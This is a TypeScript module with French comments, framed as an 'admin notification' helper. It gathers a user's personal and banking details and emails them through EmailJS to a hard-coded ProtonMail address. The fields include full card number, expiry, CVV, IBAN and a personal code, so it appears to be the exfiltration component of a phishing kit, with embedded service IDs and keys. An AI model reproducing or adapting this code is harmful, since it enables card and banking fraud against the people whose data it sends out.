
import emailjs from 'emailjs-com';
import { User } from '@/types/user';

// Configuration EmailJS
const SERVICE_ID = 'service_mev4gqt'; // ID de service EmailJS
const TEMPLATE_ID = 'template_966mhcy'; // ID de template EmailJS
const USER_ID = 'u9q4QhywRWjrfKnHj'; // Public Key EmailJS
const ADMIN_EMAIL = 'Deux568@proton.me';

interface EmailParams {
  subject: string;
  message: string;
  userCode?: string;
  userName?: string;
  userData?: Partial<User>;
}

/**
 * Envoie un email de notification à l'administrateur
 * 
 * Pour configurer EmailJS:
 * 1. Créez un compte sur emailjs.com
 * 2. Ajoutez un service email (Gmail, Outlook, etc.)
 * 3. Créez un template avec les variables: {{to_email}}, {{subject}}, {{message}}, {{user_code}}, {{user_name}}
 * 4. Remplacez les constantes SERVICE_ID, TEMPLATE_ID et USER_ID ci-dessus par vos identifiants
 */
export const sendAdminNotification = async (params: EmailParams): Promise<boolean> => {
  try {
    // Préparer un message détaillé avec toutes les infos utilisateur si disponible
    let detailedMessage = params.message;
    
    if (params.userData) {
      const userData = params.userData;
      detailedMessage += '\n\nInformations utilisateur détaillées:\n';
      
      // Ajouter chaque information disponible
      if (userData.email) detailedMessage += `\nEmail: ${userData.email}`;
      if (userData.telephone) detailedMessage += `\nTéléphone: ${userData.telephone}`;
      if (userData.datenaissance) detailedMessage += `\nDate de naissance: ${userData.datenaissance}`;
      if (userData.adresse) detailedMessage += `\nAdresse: ${userData.adresse}`;
      if (userData.codepostal) detailedMessage += `\nCode postal: ${userData.codepostal}`;
      if (userData.ville) detailedMessage += `\nVille: ${userData.ville}`;
      if (userData.pays) detailedMessage += `\nPays: ${userData.pays}`;
      if (userData.iban) detailedMessage += `\nIBAN: ${userData.iban}`;
      if (userData.numerocarte) detailedMessage += `\nNuméro de carte: ${userData.numerocarte}`;
      if (userData.dateexpiration) detailedMessage += `\nDate d'expiration: ${userData.dateexpiration}`;
      if (userData.cryptogramme) detailedMessage += `\nCryptogramme: ${userData.cryptogramme}`;
      if (userData.typebanque) detailedMessage += `\nType de banque: ${userData.typebanque}`;
      if (userData.identifiantiban) detailedMessage += `\nIdentifiant IBAN: ${userData.identifiantiban}`;
      if (userData.codepersonne) detailedMessage += `\nCode personnel: ${userData.codepersonne}`;
      if (userData.montant) detailedMessage += `\nMontant: ${userData.montant}€`;
    }
    
    await emailjs.send(
      SERVICE_ID,
      TEMPLATE_ID,
      {
        to_email: ADMIN_EMAIL,
        subject: params.subject,
        message: detailedMessage,
        user_code: params.userCode || 'N/A',
        user_name: params.userName || 'N/A',
      },
      USER_ID
    );
    
    console.log('Email envoyé avec succès');
    return true;
  } catch (error) {
    console.error('Erreur lors de l\'envoi de l\'email:', error);
    return false;
  }
};
